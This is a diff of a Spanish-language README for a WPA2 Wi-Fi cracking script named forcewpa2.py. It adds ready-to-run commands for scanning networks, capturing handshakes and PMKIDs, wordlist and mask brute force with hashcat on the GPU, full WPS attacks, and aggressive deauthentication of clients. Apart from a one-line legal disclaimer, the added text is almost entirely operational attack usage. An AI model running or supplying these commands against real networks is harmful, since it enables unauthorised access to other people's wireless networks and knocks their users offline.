@@ -18,18 +18,30 @@ Usar contra redes sin permiso es **ilegal**. El autor no se hace responsable.
 sudo apt install aircrack-ng hashcat
 pip install scapy
 
-🚀 Comandos de uso rápido
-# Dar permisos de ejecución
-chmod +x forcewpa2.py
+🎯 Comandos de ejemplo con nuevas opciones
+# Escaneo detallado
+sudo python3 forcewpa2.py -i wlan0 --scan-only -v
 
-# Modo escaneo (solo ver redes)
-sudo python3 forcewpa2.py -i wlan0 --scan-only
+# Múltiples diccionarios en cascada
+sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --wordlists rockyou.txt passwords.txt spanish.txt --gpu
 
-# Ataque completo (captura + brute force con CPU)
-sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF -c 6 -w rockyou.txt
+# Ataque por máscara (8 dígitos numéricos)
+sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --mask '?d?d?d?d?d?d?d?d' --gpu
 
-# Con GPU (hashcat)
-sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF -c 6 -w rockyou.txt --gpu
+# Captura PMKID (más rápido, sin clients)
+sudo python3 forcewpa2.py -i wlan0 --pmkid
 
-# Modo interactivo (escanea y te deja elegir objetivo)
-sudo python3 forcewpa2.py -i wlan0
+# Ataque WPS completo
+sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --wps
+
+# Usar handshake existente + reglas hashcat
+sudo python3 forcewpa2.py -i wlan0 --handshake captura.cap -w rockyou.txt --rules best64.rule --gpu
+
+# Con notificaciones y output JSON
+sudo python3 forcewpa2.py -i wlan0 --scan-only --notify --output resultados.json
+
+# Deauth agresivo (nivel 10)
+sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --deauth 10
+
+# Time limit de 5 minutos
+sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --max-time 300
